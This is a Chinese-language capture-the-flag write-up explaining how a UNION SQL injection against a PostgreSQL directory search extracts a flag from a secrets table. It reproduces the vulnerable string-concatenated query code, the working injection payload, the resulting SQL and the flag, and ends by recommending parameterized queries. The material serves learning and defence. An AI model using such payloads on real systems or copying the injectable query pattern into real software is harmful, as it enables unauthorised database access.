# Greycademy Directory

## 题目简述

目录页面根据用户名查询 PostgreSQL。应用把表单值直接插入 SQL，查询结果固定为两列；flag 则存放在另一个 `secrets(secret)` 表中。需要使用 UNION SQL 注入把 secret 映射到原查询的两列结果中。

## 解题过程

服务端构造查询的代码为：

```python
current_query = (
    "SELECT username, email FROM accounts "
    f"WHERE username LIKE '%{search_term}%'"
)
cur.execute(current_query)
```

开启页面的 debug mode 可以看到最终 SQL 和原始返回行。因为原查询返回 `username, email` 两列，UNION 分支也必须给出两列；第一列使用常量标签，第二列读取 `secrets.secret`：

```sql
jinkai' UNION SELECT 'flag', secret FROM secrets --
```

代入后，数据库执行的核心语句为：

```sql
SELECT username, email
FROM accounts
WHERE username LIKE '%jinkai'
UNION SELECT 'flag', secret FROM secrets --%'
```

`--` 注释掉应用追加的 `%'`，第二个 SELECT 将 flag 放进页面原本用于 email 的列。页面显示：

```text
grey{looking_up_the_flag_is_easy_with_SQLI!}
```

仓库源码同时确认 `accounts` 与 `secrets` 的表结构，以及 flag 只被插入 `secrets`，因此不需要猜测列数或表名。

## 方法总结

UNION 注入必须匹配原查询的列数，并让各列类型可兼容。调试面板只是降低了观察成本，根因仍是字符串拼接 SQL；修复应改用参数化查询，例如 `WHERE username LIKE %s` 并把搜索词作为参数传入。最终 flag 为 `grey{looking_up_the_flag_is_easy_with_SQLI!}`。
